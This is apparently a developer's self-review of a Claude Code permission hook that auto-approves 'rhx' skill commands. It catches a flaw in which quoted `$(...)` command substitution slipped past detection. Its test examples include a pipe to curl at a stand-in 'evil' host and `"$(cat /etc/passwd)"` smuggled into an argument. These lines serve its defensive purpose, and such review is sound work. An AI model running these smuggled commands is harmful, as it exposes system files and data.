# self-review round 7: has-behavior-declaration-adherance

## objective

verify the blueprint correctly interprets and adheres to the vision and criteria — not just coverage, but correctness.

## adherance check: JSON output structure

**vision specifies**:
```json
{
  "hookSpecificOutput": {
    "hookEventName": "PreToolUse",
    "permissionDecision": "allow",
    "permissionDecisionReason": "rhx skill auto-approved"
  }
}
```

**blueprint specifies**: same structure exactly

**adherance check**: does the `hookEventName` value match the hook type?
- hook type: PreToolUse
- value: "PreToolUse"

**verdict**: adheres correctly

## adherance check: operator detection logic

**vision says**: operators OUTSIDE quotes should reject, operators INSIDE quotes should allow

**blueprint approach**: strip quoted content via sed, then check for operators

**adherance analysis**:
- sed `s/'[^']*'//g` removes single-quoted strings
- sed `s/"[^"]*"//g` removes double-quoted strings
- left text is unquoted — if operators present, reject

**test against vision examples**:
- `rhx sedreplace --old '{ identity: x }'` → after strip: `rhx sedreplace --old  ` → no operators → allow ✓
- `rhx skill | curl evil` → after strip: `rhx skill | curl evil` → pipe found → reject ✓

**verdict**: adheres correctly

## adherance check: exit code semantics

**vision says**: pass-through means normal permission flow applies

**blueprint specifies**: exit 0 for pass-through, exit 0 for allow (with JSON output)

**adherance analysis**:
- exit 0 without output = pass-through (Claude Code continues normal flow)
- exit 0 with `permissionDecision: allow` = explicit allow

**this matches Claude Code hook semantics**: exit 0 is "success", the JSON output determines what the success means.

**verdict**: adheres correctly

## adherance check: rhx prefix patterns

**vision says**: match rhx and npx rhachet commands

**blueprint lists**:
1. `rhx`
2. `npx rhachet run --skill`
3. `npx rhx`
4. `./node_modules/.bin/rhx`
5. `./node_modules/.bin/rhachet`

**adherance analysis**: are these all valid entry points for rhachet skills?
- `rhx` — yes, shell alias
- `npx rhachet run --skill` — yes, full invocation
- `npx rhx` — yes, npx shorthand
- `./node_modules/.bin/rhx` — yes, direct binary path
- `./node_modules/.bin/rhachet` — yes, direct binary path

**absent patterns**: none detected. covers shell alias, npx, and direct paths.

**verdict**: adheres correctly

## adherance check: fail-safe behavior

**vision says**: hook error should fall back to normal flow, not bypass security

**blueprint specifies**: all non-allow codepaths exit 0 without JSON output

**adherance analysis**:
- if jq fails → no JSON output → pass-through
- if stdin empty → exit 0 early → pass-through
- if tool not Bash → exit 0 early → pass-through

**verdict**: adheres correctly — errors always fall back to prompts

## adherance check: test case interpretation

**vision N5 says**: `rhx --old "$(cat passwd)"` should NOT be auto-approved

**blueprint interprets**: command substitution `$(` detected → pass-through

**potential issue**: the `$(` is inside quotes in this example

**deeper analysis**:
- the vision example shows `"$(cat passwd)"` with double quotes
- our sed strips double-quoted content: `s/"[^"]*"//g`
- after strip: `rhx --old ` → no `$(` found → would this incorrectly allow?

**wait**: the sed pattern `"[^"]*"` matches quote-to-quote. but `$(...)` is inside the quotes, so it gets stripped.

**this is a problem**: we would strip the `$(...)` along with the quotes, so we wouldn't detect it.

**hold on**: let me re-read the vision more carefully.

**vision says**: `rhx sedreplace --old "$(cat /etc/passwd)" ...` — the `$()` is inside the argument quotes, but it's still dangerous because bash expands it BEFORE it passes the result to rhx.

**the issue**: bash processes `$(...)` before the command runs. so even though it's "inside quotes", bash still executes it.

**conclusion**: we need to detect `$(` BEFORE we strip quotes, not after.

**this is a real issue**: the blueprint's order of operations is wrong for command substitution.

## issue found

### issue 1: command substitution detection order

**problem**: blueprint strips quotes first, then checks for `$(`. but `$(...)` inside quotes still gets expanded by bash before the hook even sees the final command.

**however**: the hook sees the command AS WRITTEN in Claude's tool call, not as bash would execute it. so `"$(cat /etc/passwd)"` would appear literally in the command string.

**re-analysis**: Claude passes the command string to the hook. the hook sees `rhx --old "$(cat passwd)"`. we strip `"$(cat passwd)"` → we get `rhx --old `. we don't see the `$(`.

**but wait**: bash would expand `$(...)` when Claude executes the command. so if we allow this command, Claude would run it and bash would execute `cat passwd`.

**resolution options**:
1. detect `$(` before quote strip
2. detect `$(` regardless of quote context

**the vision clearly says N5 should NOT be auto-approved**. our current logic would incorrectly allow it.

**fix required**: check for `$(` and backticks BEFORE or independent of quote strip.

## fix for issue 1

update the operator detection to check for command substitution patterns BEFORE strip:

```bash
# check for command substitution BEFORE strip (they execute even in quotes)
if echo "$CMD" | grep -qE '\$\(|`'; then
  exit 0  # do NOT auto-approve
fi

# strip quotes for other operator checks
CMD_STRIPPED=$(echo "$CMD" | sed "s/'[^']*'//g" | sed 's/"[^"]*"//g')

# check rest of operators outside quotes
if echo "$CMD_STRIPPED" | grep -qE '[|;&]|&&|\|\||<\(|>\(|[^<]>|>>'; then
  exit 0
fi
```

**this ensures**: command substitution is always rejected, even when inside quotes, because bash expands it regardless.

## non-issues confirmed

### JSON structure

**why it holds**: exact match to validated community workaround structure

### prefix patterns

**why it holds**: covers all valid rhx entry points

### fail-safe behavior

**why it holds**: all error paths fall through to normal prompts

## conclusion

found one adherance issue: command substitution detection must occur before quote strip. the blueprint needs update to detect `$(` and backticks independent of quote context.

**action**: update blueprint section on quote-aware detection to handle command substitution specially.
